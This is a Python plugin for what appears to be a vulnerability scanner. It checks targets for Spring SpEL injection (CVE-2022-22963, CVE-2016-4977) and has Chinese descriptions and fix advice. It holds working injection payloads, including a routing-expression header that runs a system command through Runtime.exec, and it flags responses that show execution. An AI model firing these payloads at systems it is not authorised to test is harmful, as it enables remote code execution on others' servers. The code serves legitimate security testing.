from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("spring_spel")


@register_scanner
class SpringSpELScanner(BaseScanner):
    name = "Spring SpEL Injection"
    description = "Spring Expression Language注入可导致RCE"
    category = "spring"
    module = "spring_spel"
    risk_level = "critical"
    risk_score = 9
    cve_ids = ["CVE-2022-22963", "CVE-2016-4977"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-22963",
        "https://spring.io/security/cve-2016-4977",
    ]
    fix_suggestion = "升级Spring Framework至最新稳定版，避免将用户输入直接传入SpEL解析器"

    SPEL_PAYLOADS = [
        {
            "name": "Spring Cloud Function SpEL",
            "header": "spring.cloud.function.routing-expression",
            "value": "T(java.lang.Runtime).getRuntime().exec('id')",
            "path": "/functionRouter",
            "method": "POST",
            "detect": ["uid=", "command", "exec"],
        },
        {
            "name": "SpEL Parameter Injection",
            "param": "name",
            "value": "${7*7}",
            "path": "/",
            "method": "GET",
            "detect": ["49"],
        },
        {
            "name": "SpEL Template Injection",
            "param": "template",
            "value": "#{7*7}",
            "path": "/",
            "method": "GET",
            "detect": ["49"],
        },
    ]

    def check(self) -> bool:
        found = False
        for payload in self.SPEL_PAYLOADS:
            url = f"{self.target}{payload['path']}"

            if payload["method"] == "POST" and "header" in payload:
                headers = {payload["header"]: payload["value"], "Content-Type": "application/x-www-form-urlencoded"}
                resp = http_request("POST", url, data="test", headers=headers)
            elif "param" in payload:
                params = {payload["param"]: payload["value"]}
                resp = http_request("GET", url, params=params)
            else:
                continue

            if resp is None:
                continue

            for indicator in payload["detect"]:
                if indicator in resp.text:
                    self.add_result(
                        name=payload["name"],
                        target_url=url,
                        detail=f"SpEL注入成功，检测到特征: {indicator}",
                        payload=payload["value"],
                        response_snippet=resp.text[:500],
                        evidence=f"响应包含特征字符串: {indicator}",
                    )
                    found = True
                    break
        return found
